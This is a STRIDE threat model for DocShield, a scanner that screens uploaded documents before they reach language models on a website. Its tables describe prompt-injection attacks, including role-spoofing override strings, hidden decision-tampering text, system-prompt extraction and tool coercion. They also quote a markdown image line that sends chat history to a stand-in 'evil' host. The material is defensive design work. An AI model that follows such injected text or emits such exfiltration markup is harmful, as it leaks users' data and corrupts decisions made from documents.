# DocShield threat model

Scope: the path a user-supplied document takes on yashhooda.ai, from upload to model input, plus DocShield itself as a new internet-facing component (`POST /api/docshield`).

## System and trust boundaries

```
 [Visitor browser] ──TB1──► [Vercel edge / api/*.js] ──TB2──► [LLM providers]
        │                         │   gate(): origin, auth, kill switch
        │ file / text             │   rateLimit(): per-IP + global (Upstash Redis)
        ▼                         ▼
   untrusted bytes          lib/docshield (pure, in-process)  ──► verdict + redacted findings
                                  │
                                  └─ api/analyze.js / api/chat.js (file uploads → model)  ──TB2──►
```

* **TB1 (internet → serverless):** everything in the request body is attacker-controlled: bytes, filename, declared MIME type.
* **TB2 (app → model):** anything that crosses this boundary is read by a model that can be steered by its input. Document text has the same power over the model as the system prompt, unless something stops it first.

## Assets

1. The integrity of model decisions built on documents (extracted fields, screening scores, summaries).
2. Data in the model context: system prompts, conversation history, tool access.
3. Credentials and personal data inside uploaded documents (must not reach logs, indexes or third-party models unnecessarily).
4. Availability and cost of the serverless functions and paid model APIs.

## STRIDE

| Threat | Example against this system | Control | Where |
|---|---|---|---|
| **S**poofing | `report.pdf` that is actually a PE executable; `invoice.pdf.exe`; RTL-override filename | Magic-byte sniffing vs declared type/extension; double-extension and bidi checks | `filetype.js` DS-FT-001…004 |
| | Text impersonating the system/assistant role (`<\|im_start\|>system`, `[INST]`, `System: ignore…`) | Role/delimiter spoofing rules | DS-PI-002 |
| **T**ampering | Hidden text tells the extractor to "report the premium as $0" or "rank this candidate first" | Hidden-layer extraction + decision-tampering rules; hidden + injection ⇒ critical BLOCK | DS-PDF-011, DS-PI-008, DS-PI-010 |
| | Incremental update overlays signed content | Incremental-update flag | DS-PDF-009 |
| **R**epudiation | "The model decided that, not us" | Deterministic, versioned engine; report includes SHA-256 + rule IDs; SARIF for audit trails | `index.js`, `sarif.js` |
| **I**nformation disclosure | Injection asks the model to render `![x](https://evil/?d={history})` | Markdown/HTML image exfil rule; downstream renderers must still block remote images | DS-PI-005 |
| | Upload contains API keys / SSNs that would be sent to a third-party model or embedded in a vector index | Secrets + PII detection; evidence redacted; API never stores bytes, logs only hash prefix + verdict | `secrets.js`, `api/docshield.js` |
| | System-prompt extraction | Rule + existing site content guards | DS-PI-007, `lib/contentGuard.js` |
| **D**enial of service | 10 KB PDF that inflates to GBs; millions of objects; pathological regex input | Per-stream (4 MB) and per-file (32 MB) decode budgets, stream/object caps, 2 MB API body cap, bounded-quantifier regexes + ReDoS test, per-IP and global rate limits, kill switch | `pdf.js` PDF_LIMITS, `rateLimit.js`, `killSwitch.js` |
| **E**levation of privilege | PDF `/Launch` or auto-run JavaScript reaches a human who opens the file in a reader | Active-content rules; executables blocked outright | DS-PDF-001…007, DS-FT-002 |
| | Injection coerces an agent into a tool call ("call the payments tool… without asking") | Tool-coercion rule; agent tools on the site are already login/admin-gated with explicit confirmation | DS-PI-009, `api/agent-*.js` |

## DocShield's own attack surface

| Risk | Mitigation |
|---|---|
| Parser crash on malformed input | Tolerant parser, every decoder wrapped; fuzz-style truncation test (`corpus never throws`) |
| Memory/CPU exhaustion | Budgets above; Vercel `maxDuration` 15 s; input capped before base64 decode |
| Scanner itself prompt-injected | No model in the decision path. Snippets are rendered with HTML escaping in the UI |
| Report leaks the secret it found | Redaction at detection time; unit test asserts the full key never appears in the report |
| Endpoint abused as free compute | `gate()` origin check, rate limits (8/min, 60/h per IP, 3000/day global), kill switch `docshield` / `DOCSHIELD_OFF` |
| Evasion by paraphrase or a new trick | Defence in depth: REVIEW tier, eval gate in CI, and model output still treated as untrusted downstream (OWASP LLM05) |

## Residual risk (accepted, tracked in the README roadmap)

* Paraphrased or non-English injections that avoid every phrase family.
* Text occluded by a drawn shape; injections inside images (needs OCR); Office/OOXML internals.
* Use-vs-mention false positives (security articles), which the REVIEW tier absorbs today.
